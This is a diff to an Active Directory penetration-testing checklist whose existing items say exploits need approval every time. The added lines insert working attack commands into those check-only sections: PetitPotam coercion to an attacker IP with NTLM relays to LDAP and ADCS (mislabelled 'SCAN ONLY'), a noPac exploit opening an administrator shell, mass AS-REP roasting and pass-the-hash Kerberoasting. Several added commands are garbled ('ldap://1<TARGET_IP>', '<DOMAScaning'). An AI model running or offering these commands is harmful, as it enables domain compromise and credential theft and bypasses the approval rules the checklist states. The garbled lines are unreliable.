@@ -24,13 +24,46 @@
 ## Known vulnerability checks (checks only: the exploit needs approval every time)
 - [ ] 🟢 Safe / 🔴 Risky. PrintNightmare: `impacket-rpcdump <TARGET_IP> | egrep 'MS-RPRN|MS-PAR'` [[NOTE: from 2024, not yet checked]]. Check only; the exploit needs approval every time. (playbook: playbooks/windows/05-printnightmare.md)
 - [ ] 🟡 Noisy / Prohibited. ZeroLogon, DCs only: `enum4linux <TARGET_IP>` for the DC's NetBIOS name [[NOTE: from 2024, not yet checked]], then `python3 zerologon_tester.py <NETBIOS_DC_NAME> <TARGET_IP>` [[NOTE: from 2024, not yet checked]]. Tester only; the exploit is **Prohibited** (it breaks the domain). (playbook: playbooks/windows/06-zerologon.md)
-- [ ] 🟡 Noisy / 🔴 Risky. PetitPotam (needs a domain login): check whether the DC can be coerced. Check only; the relay needs approval every time, and only if the ROE allows relaying. (playbook: playbooks/windows/08-petitpotam.md)
+- [ ] 🟡 Noisy / 🔴 Risky. PetitPotam (needs a domain login):
+
+SCAN ONLY:
+
+Terminal 1: 
+`ntlmrelayx.py -smb2support`
+Terminal 2:
+`python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>`
+
+EXPLOITATION ONLY:
+`python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>`
+
+Example relays:
+
+```
+ntlmrelayx.py -smb2support
+ntlmrelayx.py -t ldap://1<TARGET_IP> -smb2support
+ntlmrelayx.py -t http://<TARGET_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
+```
+
+ check whether the DC can be coerced. Check only; the relay needs approval every time, and only if the ROE allows relaying. (playbook: playbooks/windows/08-petitpotam.md)
 - [ ] 🟢 Safe / 🔴 Risky. EternalBlue: `nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>` [[NOTE: from 2024, not yet checked]]. Check only; the exploit needs approval every time. (playbook: playbooks/windows/09-eternalblue.md)
 - [ ] 🟢 Safe / 🔴 Risky. NoPac (needs a domain login): check the DCs. Check only; the exploit needs approval every time. (playbook: playbooks/windows/23-nopac.md)
 
+**Scanning:**
+`netexec smb <IP ADDRESS> -u <USER> -p <PASSWORD> -M nopac`
+
+**Exploit:**
+`sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <IP ADDRESS> -<HOSTNAME> resolute -shell --impersonate administrator -use-ldap`
+
+
 ## 2. First credential
 - [ ] 🟢 Safe. **Password policy first:** `nxc smb $DC -u $U -p $P --pass-pol` (note the lockout threshold and window). Before you have a credential, try the null session (🟡 Noisy): `nxc smb $DC -u '' -p '' --pass-pol` (playbook: playbooks/windows/26-password-policy.md)
-- [ ] 🟡 Noisy. AS-REP roast (works without a password if you have usernames; build `users.txt`, one name per line, from the anonymous LDAP or RID-cycling output above, or from names found on public pages): `impacket-GetNPUsers $D/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt` (playbook: playbooks/windows/07-asrep-roasting.md)
+- [ ] 🟡 Noisy. AS-REP roast (works without a password if you have usernames; build `users.txt`, one name per line, from the anonymous LDAP or RID-cycling output above, or from names found on public pages): `impacket-GetNPUsers $D/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt` 
+
+(playbook: playbooks/windows/07-asrep-roasting.md)
+```GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -no-pass <DOMAIN.TLD>/ | grep -v UNKNOWN```
+```GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt -no-pass <DOMAScaning```
+
+
 - [ ] **(sudo)** Poisoning, **only if the ROE allows**: `sudo responder -I <iface> -A` (analyze mode) first, then full mode only if permitted
 - [ ] Spraying: **at most (threshold − 2) attempts per observation window**, logged with timestamps
 
@@ -39,6 +72,14 @@
 - [ ] 🟢 Safe / 🔴 Risky. Shares: `nxc smb <range> -u $U -p $P --shares` → look in readable shares for scripts, configs, and backups (playbooks: playbooks/general/01-access-and-identity-data.md, playbooks/ot/05-ot-files-on-shares.md)
 - [ ] 🟡 Noisy. BloodHound: `bloodhound-python -d $D -u $U -p $P -ns $DC -c All --zip`, then mark owned principals and run shortest paths (playbooks: playbooks/windows/17-misconfigured-privileges.md, playbooks/windows/15-workstation-accounts-admin.md)
 - [ ] 🟡 Noisy. Kerberoast: `impacket-GetUserSPNs $D/$U:$P -dc-ip $DC -request -outputfile kerb.txt` (playbook: playbooks/windows/25-kerberoasting.md)
+
+Add the `<AD_DOMAIN>` to /etc/hosts before running these commands:
+
+`GetUserSPNs.py -request <AD_DOMAIN>/<USER>:<PASSWORD>`
+
+`GetUserSPNs.py -request<AD_DOMAIN>/<USER> -hashes <REPLACE WITH NTLM HASHES eg ABC:DEF>`
+
+
 - [ ] ADCS: `certipy find -u $U@$D -p $P -dc-ip $DC -vulnerable -stdout`
 - [ ] 🟡 Noisy. Where can this credential log in? `nxc smb <range> -u $U -p $P`, `nxc winrm <range> -u $U -p $P` (`Pwn3d!` = local admin) (playbook: playbooks/general/02-pivoting-and-trust-boundaries.md)
 
